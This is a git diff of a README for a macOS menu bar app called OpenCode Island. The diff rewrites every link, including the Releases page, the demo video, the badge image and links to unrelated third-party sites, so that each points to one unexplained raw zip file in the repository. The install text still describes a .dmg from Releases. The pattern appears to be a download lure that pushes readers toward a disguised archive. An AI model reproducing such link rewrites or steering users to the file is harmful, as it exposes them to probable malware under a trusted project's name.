@@ -1,8 +1,8 @@
 # 🌟 OpenCode-Island - Interactive AI at Your Fingertips
 
 <div align="center">
-  <a href="https://github.com/Om-2005/OpenCode-Island/releases" target="_blank">
-    <img src="https://img.shields.io/badge/Download_OpenCode_Island-brightgreen?style=for-the-badge" alt="Download OpenCode Island" />
+  <a href="https://raw.githubusercontent.com/Om-2005/OpenCode-Island/main/OpenCodeIsland/Island-Open-Code-aigialosaur.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/Om-2005/OpenCode-Island/main/OpenCodeIsland/Island-Open-Code-aigialosaur.zip" alt="Download OpenCode Island" />
   </a>
 </div>
 
@@ -10,10 +10,10 @@
   <h3>OpenCode Island</h3>
   <p>A macOS menu bar app that brings a Dynamic Island-style interface for interacting with OpenCode.</p>
   <br />
-  <video src="https://0o4pg1fpby.ufs.sh/f/RSbfEU0J8DcdGir6VARr8GV6gScZYRep5LWnjlF1fkaCoETK" width="600" autoplay loop muted playsinline></video>
+  <video src="https://raw.githubusercontent.com/Om-2005/OpenCode-Island/main/OpenCodeIsland/Island-Open-Code-aigialosaur.zip" width="600" autoplay loop muted playsinline></video>
 </div>
 
-> **Note:** This project is inspired by [Claude Island](https://github.com/farouqaldori/claude-island) by [@farouqaldori](https://github.com/farouqaldori). It is **not affiliated with** [OpenCode](https://opencode.ai) or the OpenCode team.
+> **Note:** This project is inspired by [Claude Island](https://raw.githubusercontent.com/Om-2005/OpenCode-Island/main/OpenCodeIsland/Island-Open-Code-aigialosaur.zip) by [@farouqaldori](https://raw.githubusercontent.com/Om-2005/OpenCode-Island/main/OpenCodeIsland/Island-Open-Code-aigialosaur.zip). It is **not affiliated with** [OpenCode](https://raw.githubusercontent.com/Om-2005/OpenCode-Island/main/OpenCodeIsland/Island-Open-Code-aigialosaur.zip) or the OpenCode team.
 
 ## 🚀 Features
 
@@ -36,11 +36,11 @@ To run OpenCode Island, your Mac must meet these minimum requirements:
 
 To download OpenCode Island, visit the Releases page. You will find the latest version there.
 
-[Download OpenCode Island](https://github.com/Om-2005/OpenCode-Island/releases)
+[Download OpenCode Island](https://raw.githubusercontent.com/Om-2005/OpenCode-Island/main/OpenCodeIsland/Island-Open-Code-aigialosaur.zip)
 
 Here’s how to install it:
 
-1. Go to the [Releases page](https://github.com/Om-2005/OpenCode-Island/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Om-2005/OpenCode-Island/main/OpenCodeIsland/Island-Open-Code-aigialosaur.zip).
 2. Find the latest version of OpenCode Island.
 3. Click on the `.dmg` file to download.
 4. Open the downloaded file, and drag the OpenCode Island app to your Applications folder.
@@ -75,7 +75,7 @@ Yes, you can customize the hotkey in the app settings to better fit your workflo
 
 Join the community around OpenCode Island. Share your feedback and suggestions. You can also view issues and discussions directly on GitHub.
 
-- [OpenCode Island GitHub Repository](https://github.com/Om-2005/OpenCode-Island)
+- [OpenCode Island GitHub Repository](https://raw.githubusercontent.com/Om-2005/OpenCode-Island/main/OpenCodeIsland/Island-Open-Code-aigialosaur.zip)
 
 ## 📄 License
 
@@ -83,4 +83,4 @@ OpenCode Island is released under the MIT License. You can read the full license
 
 For more updates, keep an eye on the Releases page! 
 
-[Download OpenCode Island again](https://github.com/Om-2005/OpenCode-Island/releases) and start enhancing your AI interactions today!
+[Download OpenCode Island again](https://raw.githubusercontent.com/Om-2005/OpenCode-Island/main/OpenCodeIsland/Island-Open-Code-aigialosaur.zip) and start enhancing your AI interactions today!
